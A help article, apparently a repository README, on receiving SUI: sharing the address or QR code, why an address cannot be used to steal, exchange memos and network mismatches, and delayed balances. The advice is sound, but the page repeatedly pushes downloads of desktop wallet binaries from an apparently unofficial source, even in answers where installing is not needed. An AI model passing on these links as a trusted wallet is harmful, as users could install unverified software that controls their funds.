![SUI Wallet](assets/banner-article.png)

# Receiving SUI into your wallet

An address and a network; nothing else is needed on the sending side.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

The receive screen shows the account's address and its QR code, and either one is safe to share. An address
cannot be used to take funds, it stays the same for that account, and it works whether or not the account
has ever received anything. Give the sender the address and wait for the network to include their transfer.

## Where the address is

The address sits on the account, not on the wallet as a whole. That distinction matters more than it sounds:
an app holding several accounts shows one address per account, and the one on screen belongs to whichever
account is selected.

Send the wrong account's address and the funds arrive somewhere you can still reach - but not where you
expected, and reconciling it later is work nobody needs.
[Finding your SUI Wallet address](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/finding-your-sui-wallet-address.md) covers the selector and the two addresses an account can show.

## The QR code and the copy button

The QR code is the same address in another form, which makes it the better option when the sender is in front of you: they scan it, and no character gets mistyped on the way across. For everyone else there is the copy button.

The copy button is for everyone else. Copy the address rather than retyping it from a screenshot, and
paste it into the message yourself so you can see what you are sending - a screenshot of a QR code is also
a screenshot of whatever else was on the screen.

## Sharing it safely

An address is public information. It can be posted, printed on a page, and handed to anyone who wants to pay you, because knowing an address does not let anyone move what it holds - the signature is what spending needs, and the signature needs the key.

What an address does reveal is its history: balances and past transfers are visible to anyone who looks.
That is a privacy consideration rather than a security one, and it is the reason a second account exists
for anyone who would rather keep two activities apart.

## Why an address cannot be used to steal

Spending needs a signature, and a signature needs the key behind the address. An address is the public half of that pair, which is why it can travel freely through chats, invoices and pages without putting anything at risk at all.

The thing that must never travel is the 24 words. The confusion between the two is the most expensive
mistake in the whole product, so it is worth saying plainly: an address is safe to give away, the phrase is
not, and they look nothing alike in use.

## When a sender needs a memo or a tag

A memo or a tag is the sender's requirement, not the wallet's. Exchanges add one to route a deposit to the right internal account; a plain transfer between two people needs nothing but the address, and no memo field at all.

If an exchange gives you both an address and a tag, both have to be used, and the address has to be the one
for the network you are receiving on. A transfer without the tag can be slow to credit, and one on the
wrong network is a support request rather than a delay.

## The first incoming transfer

The balance appears when the network includes the transaction, not the instant the sender presses send.
That gap is short and normal, and it is the reason a wallet that looks empty for a moment is not evidence
of a failed transfer.

Before asking anyone to resend, check three things in order: that the address you gave matches the account
you are looking at, that the sender used the network the address belongs to, and whether the transaction
exists on the chain at all. [SUI Wallet balance not updating](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-wallet-balance-not-updating.md) takes the same three when the
balance lags after a deposit that did happen.

## What a sender needs from you

One line: the address, and if they are an exchange, the network name. Sending them a paragraph of context is how the wrong field gets filled in, and the network field is the one that decides whether the deposit is credited.

[How to send SUI from your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/how-to-send-sui-from-your-wallet.md) covers the other side of this exchange - what the sender sees,
what the confirmation window shows them, and why their small test send is a good sign rather than an
insult.

## FAQ

### Can a brand-new address receive a token with no history?

Yes. An address works from the moment it exists; a deposit does not need the account to have received
anything before. What the sender needs is the right address and, for an exchange, the right network.

### Why has my deposit not appeared yet?

Usually because the transaction has not been included yet, or because it was sent on a different network.
Check the address and the network first, then whether the transaction exists on the chain.

### Why was my transfer to an exchange not credited?

The most common cause is a network mismatch: the transfer exists, but not on the network the exchange
credits. The second is a missing tag. Neither is fixed by resending.

### Can someone steal my funds with my address?

No. An address is public and cannot be used to sign anything. Theft needs the 24 words or an approved
signature, and neither travels with an address.

### Should I use a new address for every payment?

Not necessary for safety. One address per account is normal; a second account is the tool for keeping two
activities apart.

### Do I need the current release to receive?

No, but install it anyway. The reported problems are fixed in the current release
([release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest)), and an older
build is where a stale balance or an unclear state comes from.
